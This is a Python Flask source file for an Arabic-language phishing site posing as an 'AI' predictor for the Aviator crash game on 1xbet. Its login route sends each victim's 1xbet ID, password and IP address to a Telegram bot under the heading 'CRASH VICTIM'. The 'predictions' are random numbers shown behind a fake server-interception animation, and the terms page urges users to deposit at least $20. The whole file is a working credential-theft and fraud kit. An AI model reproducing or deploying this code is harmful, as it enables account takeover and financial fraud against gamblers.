from flask import Flask, render_template_string, request, jsonify, session
import requests
import random
import time
import os
from datetime import datetime

app = Flask(__name__)

SECRET_KEY = os.environ.get('SECRET_KEY', 'fallback-secret-key')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

app.secret_key = SECRET_KEY

def send_to_telegram(uid, pwd, ip):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        msg = f"🔥 CRASH VICTIM 🔥\n\n🆔 ID: {uid}\n🔑 PASS: {pwd}\n🌐 IP: {ip}\n🕒 TIME: {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

HTML = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crash Predictor | Aviator AI</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0f1e;
            color:#fff;
            font-family:'Segoe UI',sans-serif;
            text-align:center;
            padding:20px;
            transition:0.3s;
            overflow-x:hidden;
        }
        /* تأثيرات الذكاء الاصطناعي */
        .ai-bg {
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            z-index:-1;
            opacity:0.15;
            pointer-events:none;
        }
        .ai-bg::before {
            content:'';
            position:absolute;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background-image: 
                linear-gradient(#00aaff 1px, transparent 1px),
                linear-gradient(90deg, #00aaff 1px, transparent 1px);
            background-size: 40px 40px;
            animation: gridMove 20s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }
        .robot {
            position:fixed;
            font-size:35px;
            opacity:0.2;
            animation: robotMove 15s linear infinite;
            z-index:-1;
            pointer-events:none;
        }
        @keyframes robotMove {
            0%{transform:translateX(-100px) translateY(0px)}
            100%{transform:translateX(calc(100vw + 100px)) translateY(0px)}
        }
        /* قائمة همبرجر */
        .menu-btn {
            position:fixed;
            top:15px;
            right:15px;
            background:#ffd700;
            color:#000;
            width:45px;
            height:45px;
            border-radius:50%;
            display:none;
            align-items:center;
            justify-content:center;
            cursor:pointer;
            z-index:1001;
            font-size:24px;
            font-weight:bold;
            box-shadow:0 2px 10px rgba(0,0,0,0.3);
        }
        .menu-btn.show { display:flex; }
        .sidebar{
            position:fixed;
            top:0;
            right:-280px;
            width:280px;
            height:100%;
            background:rgba(10,10,20,0.98);
            backdrop-filter:blur(15px);
            transition:0.3s;
            z-index:1000;
            padding:20px;
            border-left:1px solid #ffd700;
        }
        .sidebar.active{right:0}
        .sidebar-header{text-align:center;padding:20px 0;border-bottom:1px solid #ffd700;margin-bottom:20px}
        .sidebar-header h3{color:#ffd700}
        .sidebar-header p{margin-top:10px;background:#000;padding:8px;border-radius:20px}
        .sidebar-menu{list-style:none}
        .sidebar-menu li{padding:12px;border-bottom:1px solid rgba(255,215,0,0.2);cursor:pointer;transition:0.2s}
        .sidebar-menu li:hover{background:rgba(255,215,0,0.1);padding-right:20px}
        .sidebar-menu li a{color:#fff;text-decoration:none;display:block}
        .overlay{
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background:rgba(0,0,0,0.7);
            z-index:999;
            display:none;
        }
        .overlay.active{display:block}
        .container{max-width:600px;margin:0 auto;padding:70px 15px 20px;position:relative;z-index:1}
        .cards-row{display:flex;justify-content:center;gap:15px;flex-wrap:wrap;margin:30px 0}
        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:20px;text-align:center;border:1px solid rgba(255,215,0,0.3);flex:1;min-width:200px;max-width:250px}
        .btn{background:linear-gradient(135deg,#ffd700,#ff8c00);color:#000;padding:12px;border:none;border-radius:50px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}
        input{width:100%;padding:12px;margin:8px 0;background:rgba(0,0,0,0.6);border:1px solid #ffd700;border-radius:30px;color:#fff}
        .prediction-card{
            background:linear-gradient(135deg,#1a1a2e,#16213e);
            border-radius:30px;
            padding:30px;
            text-align:center;
            border:2px solid #ffd700;
            margin:20px 0;
            position:relative;
        }
        /* خوارزميات وشبكات هكر */
        .hacker-overlay {
            position:absolute;
            top:0;
            left:0;
            width:100%;
            height:100%;
            pointer-events:none;
            z-index:0;
            overflow:hidden;
            border-radius:30px;
        }
        .hacker-overlay span {
            position:absolute;
            font-size:10px;
            color:#00aaff;
            opacity:0.4;
            white-space:nowrap;
        }
        .prediction-card > * { position:relative; z-index:1; }
        .prediction-number{font-size:5rem;font-weight:bold;color:#ff3300;text-shadow:0 0 10px #ff0000;margin:20px 0}
        /* صورة الطائرة الدوارة */
        .rotating-plane{width:100px;height:100px;margin:20px auto;animation:spinPlane 1s linear infinite}
        .rotating-plane img{width:100%;height:100%;object-fit:contain}
        @keyframes spinPlane{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        /* صورة الشعار الكبيرة */
        .logo-large {
            width: 200px;
            max-width: 80%;
            margin: 0 auto 20px;
            display: block;
        }
        /* صورة الإعلان البديلة */
        .promo-img {
            width: 100%;
            max-width: 280px;
            margin: 10px auto;
            display: block;
            border-radius: 15px;
        }
        .user-bar{display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.5);border-radius:50px;padding:8px 18px;margin-bottom:20px}
        .user-id{background:#ffd700;color:#000;padding:5px 16px;border-radius:30px;font-weight:bold}
        .modal{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a2e;border:2px solid #ffd700;border-radius:20px;padding:25px;z-index:2000;display:none;width:80%;max-width:350px;text-align:center}
        .modal.active{display:block}
        .modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1999;display:none}
        .modal-overlay.active{display:block}
        .footer{text-align:center;font-size:0.7rem;color:#555;margin-top:30px}
        @media(max-width:500px){.cards-row{flex-direction:column;align-items:center}.card{max-width:100%}.prediction-number{font-size:3rem}}
        body.light-mode{background:#f5f5f5;color:#333}
        body.light-mode .card,body.light-mode .sidebar,body.light-mode .prediction-card{background:rgba(0,0,0,0.05);border-color:#ff6600}
    </style>
</head>
<body>

<!-- خلفية الذكاء الاصطناعي -->
<div class="ai-bg"></div>
<div class="robot" style="animation-duration:25s">🤖</div>
<div class="robot" style="animation-duration:18s; animation-delay:2s">🕸️</div>
<div class="robot" style="animation-duration:30s; animation-delay:5s">🔍</div>
<div class="robot" style="animation-duration:22s; animation-delay:8s">💻</div>

<div class="menu-btn" id="menuBtn" onclick="toggleSidebar()">☰</div>
<div class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <h3>👤 الملف الشخصي</h3>
        <p id="profileUserId">ID: {{user_id}}</p>
    </div>
    <ul class="sidebar-menu">
        <li><a href="#" onclick="closeSidebar(); showPage('profile')">👤 ملفي الشخصي</a></li>
        <li><a href="#" onclick="closeSidebar(); showPage('terms')">📜 الشروط والأحكام</a></li>
        <li><a href="#" onclick="closeSidebar(); toggleTheme()">🌓 الوضع الليلي / النهاري</a></li>
        <li><a href="#" onclick="closeSidebar(); window.open('https://t.me/hkarz1xbetAmeen54bot', '_blank')">📞 فريق الدعم</a></li>
        <li><a href="#" onclick="closeSidebar(); logout()">🚪 تسجيل الخروج</a></li>
    </ul>
</div>
<div class="overlay" id="overlay" onclick="closeSidebar()"></div>
<div class="modal-overlay" id="modalOverlay"></div>
<div class="modal" id="freeTrialModal">
    <h3 style="color:#ffd700;">🎉 عرض خاص!</h3>
    <p style="margin:15px 0;">تفعيل الاشتراك المجاني<br><strong>3 أيام مجانية</strong></p>
    <button class="btn" onclick="closeModalAndGoToPredictor()">🚀 تفعيل الآن</button>
</div>

<div class="container" id="mainContainer"></div>

<script>
    let currentUserId = '{{user_id}}';
    
    function toggleSidebar() {
        document.getElementById('sidebar').classList.toggle('active');
        document.getElementById('overlay').classList.toggle('active');
    }
    function closeSidebar() {
        document.getElementById('sidebar').classList.remove('active');
        document.getElementById('overlay').classList.remove('active');
    }
    function toggleTheme() { document.body.classList.toggle('light-mode'); closeSidebar(); }
    function logout() { fetch('/logout'); location.reload(); }
    function closeModalAndGoToPredictor() {
        document.getElementById('freeTrialModal').classList.remove('active');
        document.getElementById('modalOverlay').classList.remove('active');
        showPage('predictor');
    }
    
    // إظهار/إخفاء زر الهمبرجر حسب الصفحة
    function updateMenuButton(page) {
        const menuBtn = document.getElementById('menuBtn');
        if(page === 'predictor') {
            menuBtn.classList.add('show');
        } else {
            menuBtn.classList.remove('show');
            closeSidebar();
        }
    }
    
    // حفظ حالة تسجيل الدخول في localStorage لمنع الخروج عند تحديث الصفحة
    function saveLoginState(uid) {
        if(uid && uid !== 'ضيف') {
            localStorage.setItem('loggedInUserId', uid);
        }
    }
    
    function loadLoginState() {
        const savedId = localStorage.getItem('loggedInUserId');
        if(savedId && savedId !== 'ضيف' && currentUserId === 'ضيف') {
            currentUserId = savedId;
            showPage('predictor');
            return true;
        }
        return false;
    }
    
    const pages = {
        welcome: `
            <div style="text-align:center;">
                <img src="https://i.ibb.co/QFmWM96g/aviator-1x.webp" class="logo-large" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'">
                <p style="margin-bottom:20px;">نظام توقعات احترافي مدعوم بالذكاء الاصطناعي</p>
                <div class="cards-row">
                    <div class="card"><h3>🔗 ربط الحساب</h3><p>اربط حساب 1xbet للحصول على التوقعات</p><button class="btn" onclick="showPage('link')">ربط حسابي</button></div>
                </div>
                <img src="https://i.ibb.co/YTVyH73v/Gemini-Generated-Image-41ko3b41ko3b41ko.jpg" class="promo-img" onerror="this.style.display='none'">
                <div class="footer">© 2026 Crash Predictor | نظام توقعات مدعوم بالروبوتات والذكاء الاصطناعي</div>
            </div>
        `,
        link: `
            <h2 style="text-align:center;color:#ffd700;">🔗 ربط الحساب</h2>
            <div class="card">
                <input type="text" id="uid" placeholder="معرف ID (10 أرقام فقط)">
                <input type="password" id="pwd" placeholder="كلمة المرور">
                <button class="btn" onclick="submitLogin()">تسجيل الدخول</button>
                <div style="margin-top:15px;"><a href="#" onclick="showPage('welcome'); return false;" style="color:#ffd700;">← العودة</a></div>
            </div>
        `,
        predictor: `
            <div class="user-bar"><span class="user-id">🎯 ${currentUserId}</span><span>⭐ مجانية</span></div>
            <div class="prediction-card">
                <div class="hacker-overlay" id="hackerOverlay"></div>
                <div id="predictionDisplay"><div class="prediction-number">--x</div></div>
                <div id="loadingDisplay" style="display:none;"><div class="rotating-plane"><img src="https://i.ibb.co/99YxWnqD/aviator-1x.webp" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1946/1946429.png'"></div><div style="margin-top:10px;">🔄 جاري الاعتراض على السيرفر...</div></div>
                <button class="btn" id="predictBtn" onclick="getPrediction()">🎯 توقع التالي</button>
            </div>
            <div class="footer">⚡ نظام توقعات فوري | نتائج دقيقة</div>
        `,
        profile: `
            <div class="card" style="text-align:center;">
                <h3>👤 ملفي الشخصي</h3>
                <p><strong>معرف ID:</strong> ${currentUserId}</p>
                <p><strong>كلمة المرور:</strong> ********</p>
                <p><strong>العضوية:</strong> مجانية (3 أيام متبقية)</p>
                <button class="btn" onclick="showPage('predictor')">← العودة للتوقعات</button>
            </div>
        `,
        terms: `
            <div class="card">
                <h2 style="color:#ffd700;">📜 الشروط والأحكام</h2>
                <p style="margin:15px 0; line-height:1.6; text-align:left;">
                    🔹 نظام توقعات لعبة Crash (Aviator) مرتبط بخوادم 1xbet.<br><br>
                    🔹 للحصول على توقعات دقيقة، يجب أن يكون حسابك في 1xbet مفعلاً وبه رصيد لا يقل عن 20 دولار.<br><br>
                    🔹 يرجى التسجيل في <a href="https://sa.1xbet.com" target="_blank" style="color:#ffd700;">1xbet.com</a> ثم العودة لإدخال بياناتك.<br><br>
                    🔹 البيانات الخاطئة أو الحسابات غير المفعلة لن تعمل مع نظام التوقعات.<br><br>
                    🔹 اشحن رصيدك بحد أدنى 20 دولار لتفعيل التوقعات الدقيقة.<br><br>
                    🔹 فريق الدعم متاح عبر تليجرام @hkarz1xbetAmeen54bot<br><br>
                    🔹 باستخدامك هذا النظام، أنت توافق على هذه الشروط.
                </p>
                <button class="btn" onclick="showPage('welcome')">← موافق</button>
            </div>
        `
    };
    
    function generateHackerText() {
        const texts = ['DATABASE', 'ENCRYPT', 'ALGORITHM', 'NETWORK', 'PROTOCOL', 'FIREWALL', 'CRYPTO', 'TCP/IP', 'AI CORE'];
        const container = document.getElementById('hackerOverlay');
        if(!container) return;
        container.innerHTML = '';
        for(let i=0; i<20; i++) {
            const span = document.createElement('span');
            span.innerText = texts[Math.floor(Math.random()*texts.length)];
            span.style.left = Math.random() * 100 + '%';
            span.style.top = Math.random() * 100 + '%';
            span.style.fontSize = (Math.random() * 8 + 6) + 'px';
            span.style.animation = `float ${Math.random() * 10 + 5}s infinite`;
            container.appendChild(span);
        }
    }
    
    function showPage(page) {
        if(page === 'predictor' && currentUserId === 'ضيف') { 
            // محاولة استعادة الجلسة من localStorage
            const savedId = localStorage.getItem('loggedInUserId');
            if(savedId && savedId !== 'ضيف') {
                currentUserId = savedId;
            } else {
                showPage('welcome'); 
                alert('الرجاء تسجيل الدخول أولاً'); 
                return;
            }
        }
        document.getElementById('mainContainer').innerHTML = pages[page];
        if(page === 'predictor') {
            document.getElementById('predictionDisplay').style.display = 'block';
            document.getElementById('loadingDisplay').style.display = 'none';
            generateHackerText();
            // حفظ حالة تسجيل الدخول
            if(currentUserId !== 'ضيف') {
                localStorage.setItem('loggedInUserId', currentUserId);
            }
        }
        updateMenuButton(page);
        closeSidebar();
    }
    
    async function submitLogin() {
        let uid = document.getElementById('uid').value;
        let pwd = document.getElementById('pwd').value;
        // التحقق من أن ID هو 10 أرقام بالضبط
        if(!/^\\d{10}$/.test(uid)) {
            alert('❌ خطأ: معرف ID يجب أن يكون 10 أرقام بالضبط (0-9 فقط)');
            return;
        }
        let res = await fetch('/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:uid, password:pwd}) });
        let data = await res.json();
        if(data.success) {
            currentUserId = uid;
            saveLoginState(uid);
            document.getElementById('freeTrialModal').classList.add('active');
            document.getElementById('modalOverlay').classList.add('active');
        } else {
            alert('خطأ في البيانات');
        }
    }
    
    async function getPrediction() {
        let btn = document.getElementById('predictBtn');
        let predDiv = document.getElementById('predictionDisplay');
        let loadDiv = document.getElementById('loadingDisplay');
        btn.disabled = true;
        predDiv.style.display = 'none';
        loadDiv.style.display = 'block';
        let res = await fetch('/predict');
        let data = await res.json();
        setTimeout(() => {
            loadDiv.style.display = 'none';
            predDiv.style.display = 'block';
            document.querySelector('.prediction-number').innerHTML = data.prediction + 'x';
            btn.disabled = false;
        }, 3000);  // 3 ثواني بالضبط
    }
    
    // محاولة استعادة الجلسة عند تحميل الصفحة
    window.addEventListener('load', () => {
        const savedId = localStorage.getItem('loggedInUserId');
        if(savedId && savedId !== 'ضيف') {
            currentUserId = savedId;
            showPage('predictor');
        } else {
            showPage('welcome');
        }
    });
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML, user_id=session.get('user_id', 'ضيف'))

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    uid = data.get('user_id', '').strip()
    pwd = data.get('password', '')
    if not uid.isdigit() or len(uid) != 10:
        return jsonify({"success": False})
    send_to_telegram(uid, pwd, request.remote_addr)
    session['user_id'] = uid
    return jsonify({"success": True})

@app.route('/predict')
def predict():
    time.sleep(random.uniform(2.8, 3.2))
    r = random.randint(1, 100)
    if r <= 50: pred = round(random.uniform(1.0, 9.9), 1)
    elif r <= 80: pred = round(random.uniform(10.0, 19.9), 1)
    else: pred = round(random.uniform(20.0, 29.9), 1)
    return jsonify({"prediction": pred})

@app.route('/logout')
def logout():
    session.clear()
    return ""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
